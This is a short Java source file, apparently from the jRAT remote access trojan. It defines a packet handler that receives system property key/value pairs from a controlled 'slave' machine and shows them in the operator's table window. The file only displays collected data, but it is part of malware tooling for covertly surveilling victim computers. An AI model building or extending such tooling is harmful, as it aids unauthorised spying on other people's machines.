package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.FrameSystem;

import java.io.DataInputStream;


public class Packet32SystemProperties extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameSystem frame = FrameSystem.instances.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		if (frame != null) {
			frame.model.addRow(new Object[] { key, value });
		}
	}

}
